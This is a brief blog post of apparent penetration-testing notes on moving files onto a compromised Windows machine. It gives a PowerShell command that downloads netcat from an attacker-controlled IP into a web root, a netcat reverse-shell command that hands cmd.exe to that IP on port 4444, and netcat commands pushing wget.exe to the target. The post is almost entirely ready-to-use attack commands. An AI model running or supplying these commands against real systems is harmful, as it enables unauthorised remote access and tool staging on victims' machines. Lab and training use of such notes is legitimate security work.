---
layout: post
title:  "file transfer - windows - powershell / impacket-smbserver / tftp"
date:   2022-01-01
categories: web
---


# Powershell

## Download Files

```bash

powershell.exe Invoke-WebRequest -Uri "http://<my ip>:81/netcat/nc64.exe" -OutFile "C:\xampp\htdocs\nc.exe"

```

## Reverse Shell


```bash

cmd.exe /c C:\xampp\htdocs\nc.exe -e cmd.exe <my ip> 4444

```

# Netcat

## windows redirect any outpur

```bash
nc -nlvp 4444 > incoming.exe
```

## kali push wget to windows

```bash
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```